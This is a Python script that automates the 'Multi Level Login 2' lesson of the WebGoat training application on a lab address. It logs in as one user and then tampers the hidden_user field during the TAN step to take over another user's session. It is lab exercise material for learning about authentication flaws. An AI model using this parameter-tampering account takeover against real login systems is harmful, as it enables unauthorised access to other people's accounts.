# How to Analyze and Automate Login Behavior
import re
import requests
from requests.auth import HTTPBasicAuth

base_url = "http://192.168.56.105/WebGoat"

# WebGoat HTTP Basic Authentication credentials
auth = HTTPBasicAuth("guest", "guest")

session = requests.Session()


def initialize_webgoat():
    print("\n[+] Loading application...")

    # Open Webgoat application
    session.get(f"{base_url}/attack", auth=auth)

    # Click Start Button
    session.post(
        f"{base_url}/attack",
        data={"start": "Start WebGoat"},
        auth=auth
    )

    print("[DEBUG] App initialized")


def get_lesson_screen():
    print("\n[+] Getting lesson screen...")

    # Click on a lesson page
    r = session.get(f"{base_url}/attack", auth=auth)

    # Extract lesson hrefs
    matches = re.findall(
        r'href="[^"]*Screen=(\d+)&menu=500[^"]*">([^<]+)</a>',
        r.text
    )

    print(f"[DEBUG] Found Matches -> {matches}")

    for screen, title in matches:
        print(f"[DEBUG] Found: {title} -> Screen {screen}")

        # Get Screen of lesson you want
        if "Multi Level Login 2" in title:
            print("[DEBUG] Selected lesson:", screen)
            return screen

    print("[ERROR] Lesson not found")

    return None


def fetch_lesson(screen):
    print("\n")
    print("[+] Fetching lesson...")

    if not screen:
        print("[ERROR] No Screen provided")
        return None
    
    # Construct lesson url to Multi Level Login 2
    lesson_url = f"{base_url}/attack?Screen={screen}&menu=500"

    print("[DEBUG] Lesson URL:", lesson_url)

    # Send a GET Request for the lesson page
    r = session.get(lesson_url, auth=auth)

    print("[DEBUG] Lesson page length:", len(r.text))
    print("[DEBUG] Lesson URL Headers:", r.request.headers)
    print(f"\n[DEBUG] Lesson Page:\n")
    print(r.text[:500])  # Display a part of the lesson page

    return None


def enter_username_and_password(url, username, password):
    print("\n")
    print(f"\n[+] Step 1: Login as {username}")

    # Credential Payload
    data = {
        "user2": username,
        "pass2": password,
        "Submit": "Submit"
    }

    # Step 1: Submit username/password
    r = session.post(url, data=data, auth=auth)

    # Detect partial authentication
    # Regex: ensure we're in the TAN form and extract user
    match = re.search(
        r"<input[^>]+name=['\"]hidden_user['\"][^>]+value=['\"]([^'\"]+)['\"].*?"
        r"<input[^>]+name=['\"]tan2['\"]",
        r.text,  # Server response
        re.DOTALL | re.IGNORECASE
    )

    print(f"[DEBUG] Found Match -> {match}")

    if match:
        real_user = match.group(1)
        print(f"[DEBUG] TAN form detected for user: {real_user}")

        # Show snippet around hidden_user field (more reliable than tan2)
        index = match.start()
        print(r.text[index:index+200])
    else:
        print("[ERROR] TAN form not detected")

    return None


def tan_authentication(url, target_user, tan):
    print("\n")
    print(f"[+] Step 2: Submit TAN for user -> {target_user}")

    # TAN Credential Payload
    data = {
        "hidden_user": target_user,  # <-- vulnerable parameter
        "tan2": tan,
        "Submit": "Submit"
    }

    # Step 2: Submit TAN
    r = session.post(url, data=data, auth=auth)

    print("[DEBUG] Response length:", len(r.text))

    # Detect full authentication
    # Detect authenticated state via logout link
    match = re.search(
        r"href=['\"][^'\"]*logout=true['\"]",
        r.text,  # Server response
        re.IGNORECASE
    )

    print(f"[DEBUG] Found Match -> {match}")

    if match:
        print("[DEBUG] Logout link detected (authenticated state)")

        index = match.start()
        print(r.text[index-100:index+100])
    else:
        print("[DEBUG] No logout link found")

    return r.text


def is_login_success(html):
    # --- Failure checks ---
    if re.search(r"login\s*failed", html, re.IGNORECASE):
        return False

    if re.search(r"tan\s+is\s+incorrect", html, re.IGNORECASE):
        return False

    # --- Success check (real logout link, not just text) ---
    if re.search(
        r"<a[^>]+href=['\"][^'\"]*logout=true[^'\"]*['\"]",
        html,
        re.IGNORECASE
    ):
        return True

    return False


def full_authentication_flow(screen):
    print("\n[+] Starting authentication flow...")

    # Multi-step authentication flow:
    # 1. Username/password
    # 2. TAN verification

    # Construct URL for selected lesson (Multi Level Login 2)
    lesson_url = f"{base_url}/attack?Screen={screen}&menu=500"

    # Load lesson first
    session.get(lesson_url, auth=auth)

    # USER INPUT SECTION
    username = input("Enter login username (e.g. Joe): ")
    password = input("Enter password (e.g. banana): ")
    tan = input("Enter TAN (e.g. 15161): ")

    # Attack control
    target_user = input("Enter target user (e.g. Jane or Joe): ")

    # Step 1
    enter_username_and_password(
        lesson_url,
        username,
        password
    )

    # Step 2
    final_response = tan_authentication(
        lesson_url,
        target_user,
        tan
    )

    # Result
    if is_login_success(final_response):
        print("\n[SUCCESS] Logged in!")
    else:
        print("\n[FAILED] Login failed")

    return final_response


# ===== RUN =====
initialize_webgoat()

screen = get_lesson_screen()

if screen:
    fetch_lesson(screen)
    full_authentication_flow(screen)
else:
    print("[ERROR] Could not find lesson")
